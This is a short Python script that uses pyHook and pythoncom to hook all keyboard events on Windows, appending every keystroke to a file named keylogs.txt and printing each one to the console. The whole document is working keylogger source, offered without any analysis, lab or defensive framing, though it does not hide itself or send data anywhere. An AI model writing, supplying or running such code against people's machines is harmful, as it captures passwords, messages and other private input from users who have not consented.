import pyHook
import pythoncom
import sys

def OnKeyboardEvent(event):
    # Open the file where we will write keystrokes.
    with open('keylogs.txt', 'a') as f:
        try:
            if event.Ascii > 32 and event.Ascii < 127:  # Check if it is a normal character or special key.
                f.write(chr(event.Ascii))
                print('Normal Keystroke:', chr(event.Ascii))
            else:
                f.write(str(event.Key))
                print('Special Keystroke:', str(event.Key))
        except Exception as e:  # Handle any error during writing to the file.
            print('Error occurred while writing to file:', str(e))
    return True

# Create a hook manager and hook into keyboard events.
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()

# Enter the loop.
pythoncom.PumpMessages()